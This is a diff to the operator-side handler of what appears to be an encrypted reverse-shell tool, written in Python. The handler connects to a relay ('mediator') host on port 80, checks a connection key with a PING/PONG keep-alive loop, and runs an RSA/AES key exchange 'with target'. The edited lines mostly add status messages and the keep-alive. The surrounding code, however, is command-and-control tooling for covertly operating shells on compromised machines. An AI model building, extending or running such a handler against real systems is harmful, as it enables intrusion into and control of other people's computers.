@@ -129,6 +129,7 @@ class Handler:
         return (key, key.publickey())
 
     def keyExchange(self):
+        print("Performing key exchange...")
         try:
             self.shell.sendall(self.pubKey.exportKey('PEM'))
             ready, _, _ = select.select([self.shell], [], [], 120)
@@ -136,7 +137,7 @@ class Handler:
                 message = self.shell.recv(1024)
                 cipher = PKCS1_OAEP.new(self.privKey)
                 aesKey = cipher.decrypt(message)
-                print("Key exchange successful...\n")
+                print("Key exchange successful\n")
             else:
                 print("ERROR: Connection timed out waiting for reverse shell")
                 retry = input("Retry? (Y/n): ")
@@ -153,20 +154,33 @@ class Handler:
         return aesKey
 
     def connect(self, mediatorHost):
-        # connect to moderator on operator port
-        print("Connecting to reverse shell...")
+        # connect to mediator on operator port
+        print("Connecting to reverse shell...", end="", flush=True)
         self.shell.connect((gethostbyname(mediatorHost), 80))
         # send verification
         self.shell.sendall(self.connectionKey.encode())
-        ready, _, _ = select.select([self.shell], [], [])
-        if ready:
-            verification = self.shell.recv(1024)
-        if verification.decode() != self.connectionKey:
-            print("WARNING: Connection key validation failed")
-            print("Server responded with the wrong key: {}".format(verification.decode()))
+        while True:
+            ready, _, _ = select.select([self.shell], [], [])
+            if ready:
+                signal = self.shell.recv(1024)
+            else:
+                print("Connection timed out")
+                continue
+            if signal.decode() == "PING":
+                self.shell.sendall("PONG".encode())
+                print(".", end="", flush=True)
+            elif signal.decode() == self.connectionKey:
+                print("\nConnection established")
+                break
+            else:
+                print("\nCRITIAL: Connection key validation failed")
+                print("Server responded with the wrong key: {}".format(signal.decode()))
+                exit(1)
 
     def run(self):
         # connect to server and perform key exchange with target
+        print(f"Using connection key: {self.connectionKey}")
+        print("The above key should be changing each time you run this program.\n")
         self.connect(self.mediatorHost)
         self.privKey, self.pubKey = self.getRSA()
         self.cipherKey = self.keyExchange()
